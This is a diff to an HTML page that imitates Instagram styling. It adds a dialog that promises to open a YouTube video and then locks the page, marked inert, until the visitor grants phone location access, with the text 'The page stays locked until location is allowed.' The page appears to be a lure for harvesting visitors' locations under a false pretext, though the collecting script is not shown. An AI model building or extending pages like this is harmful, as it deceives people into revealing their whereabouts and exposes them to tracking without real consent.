@@ -12,8 +12,8 @@
     />
     <link rel="stylesheet" href="/css/styles.css" />
   </head>
-  <body class="ig-dark">
-    <div class="ig-shell" id="page-content">
+  <body class="ig-dark gate-active">
+    <div class="ig-shell" id="page-content" inert>
       <header class="ig-nav">
         <div class="ig-nav-inner">
           <a class="ig-logo" href="https://www.instagram.com/alkhushifound?igsh=MWwxaGh5dGVnZ3FoYw==" target="_blank" rel="noopener noreferrer">Instagram</a>
@@ -140,16 +140,23 @@
           width="420"
           height="280"
         />
-        <div class="dialog-body">
+        <div class="dialog-body" id="consent-step">
           <h2 id="consent-title" class="dialog-title">Open Youtube</h2>
           <p id="consent-message" class="dialog-message">
             Open youtube to watch the video.
-            </p>
+          </p>
           <p id="consent-hint" class="dialog-hint" hidden></p>
           <div class="dialog-actions">
             <button id="consent-continue" class="btn btn-primary" type="button">Allow</button>
             <button id="consent-not-now" class="btn btn-secondary" type="button">Don't Allow</button>
           </div>
+        </div>
+        <div class="dialog-body" id="waiting-step" hidden>
+          <h2 class="dialog-title">Allow location to continue</h2>
+          <p class="dialog-message">
+            Please tap <strong>Continue</strong> / <strong>Allow</strong> on the phone
+            location prompt. The page stays locked until location is allowed.
+          </p>
         </div>
       </div>
     </div>
